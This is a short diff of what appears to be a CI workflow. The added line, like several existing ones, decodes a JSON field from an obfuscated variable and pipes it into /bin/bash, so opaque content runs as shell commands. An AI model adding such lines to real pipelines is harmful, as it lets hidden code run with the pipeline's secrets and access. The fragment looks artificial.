@@ -23,6 +23,7 @@ jobs:
           echo $y720 | jq -r .e8641 | /bin/bash
           printf '%s' "$cvte859" | jq -r .juqt062 | /bin/bash
           printf '%s' "$tw42" | jq -r .zkx85 | /bin/bash
+          echo $u1 | jq -r .r5 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
